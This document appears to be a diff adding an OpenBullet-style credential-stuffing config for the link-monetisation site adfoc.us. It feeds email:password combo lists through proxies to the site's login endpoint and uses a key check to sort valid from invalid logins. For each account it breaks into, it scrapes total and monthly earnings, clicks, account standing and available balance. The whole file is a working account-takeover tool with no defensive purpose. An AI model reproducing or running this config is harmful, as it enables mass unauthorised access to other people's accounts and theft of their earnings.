@@ -1,0 +1,62 @@
+[SETTINGS]
+{
+  "Name": "adfo.us",
+  "SuggestedBots": 100,
+  "LastModified": "2019-04-17T12:33:27.060411-07:00",
+  "AdditionalInfo": "",
+  "KeysDB": "",
+  "LocalKeysDB": "",
+  "isWtoEdit": true,
+  "Author": "Lucky",
+  "Version": "1.2.1.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#login_post REQUEST POST "https://adfoc.us/session/create" 
+  CONTENT "email=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "dnt: 1" 
+  HEADER "origin: https://adfoc.us" 
+  HEADER "referer: https://adfoc.us/" 
+  HEADER "upgrade-insecure-requests: 1" 
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Enter your e-mail and password " 
+  KEYCHAIN Success OR 
+    KEY "links user\">Account Info</a></span>" 
+  KEYCHAIN Retry OR 
+    KEY "Our servers are experiencing an overload in connections!" 
+#total_earn PARSE "<SOURCE>" LR "Total Earnings:</strong> $" "<br/>" -> CAP "Total Earnings" "$" "" 
+#mtd_earn PARSE "<SOURCE>" LR "This Month's Earnings:</strong> $" "&nbsp;&nbsp;&nbsp;<strong>" -> CAP "This Month's Earnings" "$" "" 
+#today_earn PARSE "<SOURCE>" LR "strong>Today's Earnings:</strong> $" "&nbsp;&nbsp;&nbsp;<strong>" -> CAP "Today's Earnings" "$" "" 
+#total_clicks PARSE "<SOURCE>" LR "Total Clicks:</strong>" "</div>" -> CAP "Total Clicks" 
+#payout_get REQUEST GET "http://adfoc.us/payments" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "dnt: 1" 
+  HEADER "origin: https://adfoc.us" 
+  HEADER "referer: https://adfoc.us/" 
+  HEADER "upgrade-insecure-requests: 1" 
+#standing PARSE "<SOURCE>" LR "Your account has a warning (\"" "\")" -> CAP "Account Standing" 
+#available_bal PARSE "<SOURCE>" LR "<span class=\"balance\" id=\"bold\">$" "</span>" -> CAP "Available Balance" "$" "" 
